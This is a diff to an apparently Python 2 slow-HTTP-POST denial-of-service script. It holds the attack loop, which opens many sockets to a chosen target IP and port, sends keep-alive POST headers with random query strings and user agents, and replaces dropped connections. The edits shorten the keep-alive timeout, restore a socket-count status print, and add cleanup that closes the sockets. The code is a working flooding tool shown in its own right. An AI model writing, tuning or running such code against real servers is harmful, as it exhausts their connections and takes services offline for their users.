@@ -32,7 +32,7 @@ def init_socket(ipDest, portDest):
     s.send("POST /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)))
     s.send("Host: {}:{}\r\n".format(ipDest, portDest))
     s.send("Connection: keep-alive\r\n")
-    s.send("Keep-Alive: timeout=600\r\n")
+    s.send("Keep-Alive: timeout=90\r\n")
     s.send("Content-Length: {}\r\n".format(contentLenght))
     s.send("Content-Type: application/json\r\n")
     s.send("User-Agent: {}\r\n".format(userAgent))
@@ -57,8 +57,8 @@ def httpPost(ID, portDest, ipDest, event, queue, n):
         socketsList.append(s)
 
     while event.is_set():
-        #print "[HTTP-POST] Sending keep-alive headers... \
-        #       Socket count: %s\n" %(len(socketsList))
+        print "[HTTP-POST] Sending keep-alive headers... \
+               Socket count: %s\n" %(len(socketsList))
 
         for s in list(socketsList):
             try:
@@ -77,9 +77,11 @@ def httpPost(ID, portDest, ipDest, event, queue, n):
                     socketsList.append(s)
             except socket.error:
                 break
+        
         event.wait(timeout=15)
 
-    for _ in range(nSockets):
-        print "[HTTP-POST] Closing socket %s\n" %(_)
+    print "[HTTP-POST] Closing sockets \n"
+    for s in list(socketsList):
+         s.close()
 
     queue.task_done()
